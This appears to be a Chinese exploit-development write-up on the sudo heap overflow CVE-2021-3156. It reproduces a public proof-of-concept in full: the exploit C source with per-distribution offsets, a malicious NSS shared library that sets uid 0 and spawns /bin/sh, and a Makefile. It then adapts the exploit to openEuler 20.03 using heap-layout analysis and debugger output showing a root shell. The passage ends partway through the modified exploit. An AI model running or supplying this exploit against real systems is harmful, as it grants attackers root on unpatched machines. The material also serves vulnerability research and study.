        execve(target->sudoedit_path, s_argv, s_envp);
        // execve(target->sudoedit_path, s_argv, NULL);
        return 0;
    }
这里的`exp`与原始的`exp`不同，原始的`exp`是用`LC_ALL`此时会在`sudo_conf_read`函数中调用`setlocale(LC_ALL,
"C"),setlocale(LC_ALL,
prev_locale)`会申请和释放大量的堆块，此时也会释放`_nl_global_locale.__names`中保存的堆块地址其实就是`newnames`中的堆块地址也就是存储我们环境变量值的堆块，通过释放大量的`0xf0`堆块进入`unsorted
bin`，然后再申请`0x20`的时候，制造一个`0xd0`大小的`small bin`。此时还会有一个`unsorted
bin`，由于在`get_user_info`会申请一个`0x80,0x1000`的堆块，此时`small bin,unsorted
bin`会互换位置，也就是`0x80`大小的堆块和`group files service_user`会在`unsorted
bin`相邻的位置申请，非常的巧妙。
初始的`exp`，`lib`，`Makefile`如下
    //hax.c
    /**
     ** CVE-2021-3156 PoC by blasty 
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 512
    typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len; 
    } target_t;
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60, 
            .lc_all_len     = 214
        }
    };
    void usage(char *prog) {
        printf("  usage: %s \n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i \n\n");
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
        int target_idx = atoi(argv[1]);
        if (target_idx = (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
        target_t *target = &targets[ target_idx ];
        printf("using target: '%s'\n", target->target_name);
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
        char *s_argv[]={
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
        for(int i = 0; i null_stomp_len; i++) {
            s_envp[envp_pos++] = "\\";
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
        char *lc_all = calloc(target->lc_all_len + 16, 1);
        strcpy(lc_all, "LC_ALL=C.UTF-8@");
        memset(lc_all+15, 'C', target->lc_all_len);
        s_envp[envp_pos++] = lc_all;
        s_envp[envp_pos++] = NULL;
        printf("** pray for your rootshell.. **\n");
        execve(target->sudoedit_path, s_argv, s_envp);
        return 0;
    }
    //lib.c
    #include 
    #include 
    #include 
    #include 
    static void __attribute__ ((constructor)) _init(void);
    static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!\n");
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
    }
    all:
        rm -rf libnss_X
        mkdir libnss_X
        gcc -o sudo-hax-me-a-sandwich hax.c
        gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_.so.2' lib.c
    clean:
        rm -rf libnss_X sudo-hax-me-a-sandwich
## For open euler 20.03
系统类似于`centos`，我们看一下`/etc/nsswitch.conf`即配置文件
    passwd:      sss files systemd
    shadow:     files sss
    group:       sss files systemd
    hosts:      files dns myhostname
    bootparams: files
    ethers:     files
    netmasks:   files
    networks:   files
    protocols:  files
    rpc:        files
    services:   files sss
    netgroup:   sss
    publickey:  files
    automount:  files sss
    aliases:    files
可以看到这里的顺序和服务规范和`ubuntu`下面不一样，因此这里的堆布局与`ubuntu`也不相同。我们先看一下系统的调用逻辑是否发生了改变。经过调试发现其调用逻辑与`ubuntu`下相同
我们将`ni`结构体手动修改如下
    pwndbg> p *ni
    $4 = {
      next = 0x0,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE},
      library = 0x555555582be0,
      known = 0x555555592b30,
      name = 0x5555555861a0 "X/P0P_SH3LLZ_ "
    }
    pwndbg> p shlib_name
    $5 = 0x7fffffffdeb0 "libnss_X/P0P_SH3LLZ_ .so.2"
经过手动修改的`ni`结构体，这里继续执行就会`getshell`。
    pwndbg> c
    Continuing.
    [+] bl1ng bl1ng! We got it!
    process 123212 is executing new program: /usr/bin/bash
    Error in re-setting breakpoint 2: No source file named sudo.c.
    Error in re-setting breakpoint 3: No source file named sudo.c.
    Error in re-setting breakpoint 4: No source file named sudo.c.
那么接下来的问题就是如何复习这个结构体了，与`ubuntu`覆写`files service_user`不同，这里需要覆写的是`sss
service_user`结构体，但是两者没有本质的区别都是`group`的第一个结构体，唯一不同的就是分配到`group`服务规范的结构体之前`get_user_info`所分配的堆块的数量，我们调试一下
    malloc(0x100)
    malloc(0x400)
    malloc(0x228) // tcache
    malloc(0x10)
    malloc(0x78)// 目标0x80堆块
    malloc(0x1000)
    malloc(0x17) // 开始为passwd分配service_user // tcache
    malloc(0x34)
    malloc(0x36)
    malloc(0x38)
    malloc(0x17) // 开始为shadow分配service_user
    malloc(0x36)
    malloc(0x34)
    malloc(0x16)// 开始为group分配service_user
    malloc(0x34)// 这里就是sss service_user的结构体
这里我们需要提前布置`6`个`0x40`大小的堆块，和一个`0xc0`大小的堆块（这里布置`0x80`的堆块不合适，因为之后会被申请并更换为高地址的`0x80`堆块，经过测试`0xc0`大小的堆块可以。）
###  EXP
    /**
     ** CVE-2021-3156 PoC by blasty 
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 0x1000
    typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len;
    } target_t;
    char *lc_names[]={
            "LC_COLLATE",
            "LC_CTYPE",
            "LC_MONETARY",
            "LC_NUMERIC",
            "LC_TIME",
            "LC_MESSAGES",
            "LC_PAPER",
            "LC_NAME",
            "LC_ADDRESS",
            "LC_TELEPHONE",
            "LC_MEASUREMENT",
            "LC_IDENTIFICATION"